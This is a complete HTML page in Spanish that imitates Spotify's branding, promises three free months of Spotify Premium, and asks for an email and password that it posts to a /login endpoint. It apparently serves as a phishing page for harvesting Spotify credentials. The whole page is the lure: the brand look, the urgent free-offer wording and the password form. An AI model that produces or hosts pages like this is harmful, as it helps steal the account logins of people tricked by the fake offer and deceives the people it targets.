<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Spotify Premium - Oferta Login Profesional</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
  <style>
    /* Reset and base */
    *, *::before, *::after {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #121212 0%, #1db954 80%);
      color: #FFFFFF;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }

    /* Container Card */
    .login-card {
      background-color: #191414;
      border-radius: 16px;
      box-shadow: 0 16px 32px rgb(29 185 84 / 0.2);
      max-width: 400px;
      width: 100%;
      padding: 48px 40px 56px;
      display: flex;
      flex-direction: column;
      gap: 32px;
      transition: box-shadow 0.3s ease;
    }
    .login-card:hover, .login-card:focus-within {
      box-shadow: 0 24px 48px rgb(29 185 84 / 0.4);
    }

    /* Logo section */
    .logo {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-bottom: 8px;
    }
    .logo-icon {
      font-size: 36px;
      color: #1DB954;
    }
    .logo-text {
      font-weight: 700;
      font-size: 28px;
      letter-spacing: 0.05em;
      color: #1DB954;
    }

    /* Headings */
    h1 {
      font-weight: 700;
      font-size: 1.75rem;
      margin: 0;
      text-align: center;
      color: #FFFFFF;
      line-height: 1.2;
    }
    p.subtitle {
      font-weight: 400;
      font-size: 1rem;
      margin: 0;
      text-align: center;
      color: #B3B3B3;
      line-height: 1.4;
    }

    /* Form styling */
    form {
      display: flex;
      flex-direction: column;
      gap: 24px;
    }
    label {
      display: none;
    }
    input[type="email"],
    input[type="password"] {
      background-color: #282828;
      border: none;
      border-radius: 8px;
      padding: 14px 16px;
      color: #FFFFFF;
      font-size: 1rem;
      transition: background-color 0.3s ease;
      outline-offset: 2px;
      outline-color: transparent;
      width: 100%;
    }
    input[type="email"]::placeholder,
    input[type="password"]::placeholder {
      color: #7a7a7a;
    }
    input[type="email"]:focus,
    input[type="password"]:focus {
      background-color: #1DB954;
      outline-color: #1DB954;
      color: #fff;
    }

    /* Button */
    button[type="submit"] {
      background-color: #1DB954;
      color: #FFFFFF;
      border: none;
      border-radius: 12px;
      font-weight: 700;
      font-size: 1.1rem;
      padding: 16px 0;
      cursor: pointer;
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      box-shadow: 0 8px 16px rgb(29 185 84 / 0.4);
      width: 100%;
    }
    button[type="submit"]:hover,
    button[type="submit"]:focus {
      background-color: #17a348;
      box-shadow: 0 12px 24px rgb(23 163 72 / 0.7);
      outline: none;
    }

    /* Responsive adjustments */
    @media (max-width: 640px) {
      body {
        padding: 24px 16px;
      }
      .login-card {
        padding: 36px 24px 48px;
        max-width: 100%;
      }
      h1 {
        font-size: 1.5rem;
      }
      .logo-text {
        font-size: 24px;
      }
    }

  </style>
</head>
<body>
  <section aria-label="Formulario de inicio de sesión para oferta Spotify Premium">
    <form class="login-card" method="POST" action="/login" novalidate>
      <div class="logo" aria-hidden="true">
        <span class="material-icons logo-icon" aria-hidden="true">music_note</span>
        <span class="logo-text">Spotify</span>
      </div>
      
      <h1>Consigue 3 meses de Spotify Premium <br />¡GRATIS!</h1>
      <p class="subtitle">Por tiempo limitado. Inicia sesión o regístrate para canjear esta oferta.</p>
      
      <label for="email">Email</label>
      <input
        type="email"
        id="email"
        name="email"
        placeholder="Correo electrónico"
        autocomplete="email"
        required
        aria-required="true"
        aria-label="Correo electrónico"
      />
      
      <label for="password">Contraseña</label>
      <input
        type="password"
        id="password"
        name="password"
        placeholder="Contraseña"
        autocomplete="current-password"
        required
        aria-required="true"
        aria-label="Contraseña"
        minlength="6"
      />
      
      <button type="submit" aria-label="Continuar con la sesión o registro">Continuar</button>
    </form>
  </section>
</body>
</html>
